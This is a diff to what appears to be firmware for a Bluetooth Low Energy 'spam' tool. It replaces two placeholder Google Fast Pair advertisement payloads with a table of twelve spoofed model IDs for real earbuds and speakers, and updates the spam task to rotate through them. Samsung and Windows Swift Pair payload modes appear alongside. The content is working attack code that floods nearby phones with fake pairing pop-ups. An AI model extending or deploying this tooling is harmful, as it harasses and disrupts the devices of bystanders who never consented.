@@ -20007,10 +20007,23 @@ static const uint8_t s_samsung_payloads[][10] = {
 #define SAMSUNG_PAYLOAD_COUNT (int)(sizeof(s_samsung_payloads)/sizeof(s_samsung_payloads[0]))
 
 // Google Fast Pair — service data UUID 0xFE2C (little-endian) + 3-byte model ID
-// Format used in ble_hs_adv_fields.svc_data_uuid16: [UUID_LO UUID_HI data...]
-static const uint8_t s_google_fp_svc[] = {0x2C,0xFE,0x00,0x00,0x00};
-static const uint8_t s_google_fp_svc2[] = {0x2C,0xFE,0x00,0xC0,0x57};
-#define GOOGLE_PAYLOAD_COUNT 2
+// Format: [0x2C 0xFE model_byte0 model_byte1 model_byte2]
+// Model IDs are 3-byte big-endian values registered with Google's Fast Pair registry
+static const uint8_t s_google_fp_payloads[][5] = {
+    {0x2C,0xFE, 0x2D,0x7A,0x23}, // Pixel Buds A-Series
+    {0x2C,0xFE, 0x71,0x8F,0xA4}, // JBL Live 300TWS
+    {0x2C,0xFE, 0xCD,0x82,0x56}, // Bose NC 700
+    {0x2C,0xFE, 0xD4,0x46,0xA7}, // Sony WH-1000XM5
+    {0x2C,0xFE, 0x07,0xF4,0x26}, // Google Nest Hub Max
+    {0x2C,0xFE, 0xF5,0x24,0x94}, // JBL Buds Pro
+    {0x2C,0xFE, 0x82,0x1F,0x66}, // JBL Flip 6
+    {0x2C,0xFE, 0x02,0xDD,0x4F}, // JBL Tune 770NC
+    {0x2C,0xFE, 0x17,0x53,0x5E}, // Sony WH-1000XM5 (alt)
+    {0x2C,0xFE, 0xF0,0x00,0x00}, // Bose QuietComfort 35 II
+    {0x2C,0xFE, 0x06,0x00,0x00}, // Pixel Buds (1st gen)
+    {0x2C,0xFE, 0x92,0xBB,0xBD}, // Pixel Buds (variant)
+};
+#define GOOGLE_PAYLOAD_COUNT (int)(sizeof(s_google_fp_payloads)/sizeof(s_google_fp_payloads[0]))
 
 // Windows Swift Pair — service UUID 0xFE14 + payload
 static const uint8_t s_windows_sp_svc[] = {0x14,0xFE,0x80,0x00,0x00,0x00,0x00};
@@ -20077,8 +20090,8 @@ static void ble_spam_task(void *pvParameters)
             break;
         case BLE_SPAM_MODE_GOOGLE:
             use_svc = true;
-            svc_data = (google_idx == 0) ? s_google_fp_svc : s_google_fp_svc2;
-            svc_data_len = sizeof(s_google_fp_svc);
+            svc_data = s_google_fp_payloads[google_idx];
+            svc_data_len = sizeof(s_google_fp_payloads[0]);
             google_idx = (google_idx + 1) % GOOGLE_PAYLOAD_COUNT;
             break;
         case BLE_SPAM_MODE_WINDOWS:
